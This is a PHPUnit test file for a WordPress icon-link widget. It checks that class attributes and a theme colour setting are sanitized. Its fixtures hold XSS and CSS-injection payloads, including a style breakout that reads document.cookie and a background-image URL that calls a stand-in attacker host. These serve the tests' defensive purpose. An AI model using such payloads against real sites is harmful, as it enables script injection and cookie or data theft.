<?php

use Brain\Monkey;
use Brain\Monkey\Functions;
use PHPUnit\Framework\TestCase;

/**
 * Tests for IconLink::printWidget() -- issue #2916.
 *
 * Two values are interpolated straight into a class="..." attribute with no
 * escaping and no sanitization on the way in (ProudWidget::update() delegates
 * to FormHelper::updateGroupsWeight(), which stores group values raw):
 *
 *   - $instance['classname'] (line 98, behind an @ suppression operator)
 *   - $instance['fa_icon']   (line 99)
 *
 * Both get \Proud\Core\sanitize_html_classes(), NOT sanitize_html_class().
 *
 * sanitize_html_class() is what the sibling cta-button-widget.class.php:116
 * used, and the issue floated it for consistency. It is wrong here: it
 * sanitizes ONE class name and strips whitespace, and 171 of the 174 distinct
 * fa_icon values on a production database copy are multi-class Font Awesome 6
 * strings ("fa-solid fa-leaf"). sanitize_html_class() collapses that to
 * "fa-solidfa-leaf" and every icon on every site disappears.
 *
 * sanitize_html_classes() (proud-helpers.php) splits on whitespace, sanitizes
 * each name and rejoins, so it closes the attribute-breakout hole without that
 * regression -- its output can only contain [A-Za-z0-9_-] and single spaces,
 * leaving nothing to break out of class="..." with. classname is sanitized the
 * same way for consistency within this template: only "action" and
 * "card-inverse" appear in real data today, but a multi-word value would break
 * identically under sanitize_html_class(). The cta-button sibling was moved
 * onto the same helper -- see CtaButtonWidgetTest.
 *
 * The @ suppression on the classname line is also removed; it was masking an
 * undefined-index notice for legacy instances saved before the field existed.
 * The null-coalescing default handles that case for real, so a missing key
 * must render cleanly rather than merely silently.
 */
class IconLinkWidgetTest extends TestCase
{
    use AppliesPreKsesFilter;

    protected function setUp(): void
    {
        parent::setUp();
        Monkey\setUp();
        $this->applyPreKsesFilter();

        // Faithful to WordPress's real esc_attr(): _wp_specialchars() with
        // double_encode = false, so an existing character reference is
        // preserved rather than re-encoded. The global stub in stubs.php is a
        // passthrough, which would turn every assertion below into a rubber
        // stamp.
        Functions\when('esc_attr')->alias(static function ($text) {
            return htmlspecialchars((string) $text, ENT_QUOTES, 'UTF-8', false);
        });
        Functions\when('esc_html')->alias(static function ($text) {
            return htmlspecialchars((string) $text, ENT_QUOTES, 'UTF-8', false);
        });
        Functions\when('esc_url')->alias(static function ($url) {
            $url = (string) $url;
            if ('' === $url) {
                return '';
            }
            if (preg_match('#^\s*javascript\s*:#i', $url)) {
                return '';
            }
            if (!preg_match('#^[a-zA-Z][a-zA-Z0-9+.-]*:#', $url) && !in_array($url[0], ['/', '#', '?'], true)) {
                $url = 'http://' . $url;
            }
            return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
        });
        Functions\when('get_theme_mod')->justReturn('#e49c11');
    }

    protected function tearDown(): void
    {
        Monkey\tearDown();
        parent::tearDown();
    }

    private function instance(array $overrides = []): array
    {
        return array_merge([
            'link_title' => 'Item title',
            'link_url'   => 'https://example.com/item',
            'classname'  => '',
            'fa_icon'    => 'fa-solid fa-leaf',
        ], $overrides);
    }

    private function render(array $instance): string
    {
        $widget = new IconLink();
        ob_start();
        try {
            $widget->printWidget([], $instance);
        } finally {
            $output = (string) ob_get_clean();
        }
        return $output;
    }

    // -----------------------------------------------------------------
    // fa_icon
    // -----------------------------------------------------------------

    public function test_fa_icon_quote_breakout_is_stripped(): void
    {
        $output = $this->render($this->instance([
            'fa_icon' => 'fa-leaf" onmouseover="alert(1)',
        ]));

        // sanitize_html_classes() drops every character outside [A-Za-z0-9_-],
        // so the quote and the equals sign are removed outright rather than
        // entity-encoded. What is left is an inert class name.
        $this->assertStringNotContainsString('onmouseover=', $output);
        $this->assertStringContainsString('class="fa fa-leaf onmouseoveralert1 fa-3x"', $output);
    }

    /**
     * Regression lock: sanitize_html_class() would strip the space and break
     * every Font Awesome 6 icon on every site. sanitize_html_classes() must be used.
     */
    public function test_multi_class_fa_icon_survives_intact(): void
    {
        $output = $this->render($this->instance(['fa_icon' => 'fa-solid fa-leaf']));

        $this->assertStringContainsString(
            'class="fa fa-solid fa-leaf fa-3x"',
            $output,
            'A multi-class fa_icon must render unchanged; sanitize_html_class() would collapse it.'
        );
    }

    public function test_missing_fa_icon_key_renders_cleanly(): void
    {
        $instance = $this->instance();
        unset($instance['fa_icon']);

        $output = $this->render($instance);

        $this->assertStringContainsString('class="fa  fa-3x"', $output);
    }

    // -----------------------------------------------------------------
    // classname
    // -----------------------------------------------------------------

    public function test_classname_quote_breakout_is_stripped(): void
    {
        $output = $this->render($this->instance([
            'classname' => 'action" onmouseover="alert(1)',
        ]));

        $this->assertStringNotContainsString('onmouseover=', $output);
        $this->assertStringContainsString('card-block action onmouseoveralert1"', $output);
    }

    public function test_real_classname_values_render_unchanged(): void
    {
        foreach (['action', 'card-inverse'] as $classname) {
            $output = $this->render($this->instance(['classname' => $classname]));
            $this->assertStringContainsString(
                'card text-center card-btn card-block ' . $classname . '"',
                $output,
                "The '{$classname}' style must still reach the class attribute."
            );
        }
    }

    /**
     * The @ suppression operator on the classname line hid an undefined-index
     * notice. Removing it only helps if the missing key is genuinely handled,
     * so convert notices to exceptions for this test and assert none is raised
     * -- with the @ still in place and no default, this passes for the wrong
     * reason, which is why the sibling assertions above matter too.
     */
    public function test_missing_classname_key_raises_no_notice(): void
    {
        $instance = $this->instance();
        unset($instance['classname']);

        set_error_handler(static function ($severity, $message) {
            throw new \ErrorException($message, 0, $severity);
        }, E_ALL);

        try {
            $output = $this->render($instance);
        } finally {
            restore_error_handler();
        }

        $this->assertStringContainsString('card text-center card-btn card-block ', $output);
    }

    /**
     * printWidget() also reads $instance['classname'] directly at the top of
     * the method to decide whether to emit the "action" colour <style> block.
     * That read has no @ and no default, so a legacy instance missing the key
     * warns there before ever reaching the attribute. Covered here so removing
     * the @ downstream does not just relocate the notice.
     */
    public function test_missing_classname_key_does_not_warn_in_action_style_branch(): void
    {
        $instance = $this->instance();
        unset($instance['classname']);

        set_error_handler(static function ($severity, $message) {
            throw new \ErrorException($message, 0, $severity);
        }, E_ALL);

        try {
            $output = $this->render($instance);
        } finally {
            restore_error_handler();
        }

        $this->assertStringNotContainsString('<style', $output, 'No action colour block without classname="action".');
    }

    public function test_action_classname_still_emits_the_style_block(): void
    {
        $output = $this->render($this->instance(['classname' => 'action']));

        $this->assertStringContainsString('.card.card-btn.action', $output);
    }

    /**
     * End-to-end cover for the security-review finding: a hostile
     * color_action_button theme mod must not reach the <style> block. The
     * helper is unit tested in ActionButtonColorTest; this proves the widget
     * actually calls it, so a revert to the bare get_theme_mod() + esc_html()
     * pair fails here. esc_html() would have let this payload through intact --
     * CSS injection needs none of the characters it encodes.
     */
    public function test_hostile_theme_mod_cannot_inject_css(): void
    {
        Functions\when('get_theme_mod')
            ->justReturn('#fff; } body { background-image: url(https://attacker.tld/log?c=x) } .x {');

        $output = $this->render($this->instance(['classname' => 'action']));

        $this->assertStringNotContainsString('attacker.tld', $output);
        $this->assertStringNotContainsString('background-image', $output);
        $this->assertStringContainsString('background-color: #e49c11;', $output);
    }

    /**
     * The Gravity Forms sibling sink concatenated this with no escaping at
     * all. Neither widget was exploitable that way -- esc_html() blocked the
     * breakout -- but the same payload must now not survive even encoded.
     */
    public function test_hostile_theme_mod_cannot_break_out_of_the_style_element(): void
    {
        Functions\when('get_theme_mod')
            ->justReturn('#fff}</style><script>alert(document.cookie)</script><style>');

        $output = $this->render($this->instance(['classname' => 'action']));

        $this->assertStringNotContainsString('script', $output);
        $this->assertStringNotContainsString('&lt;/style&gt;', $output);
        $this->assertStringContainsString('background-color: #e49c11;', $output);
    }
}
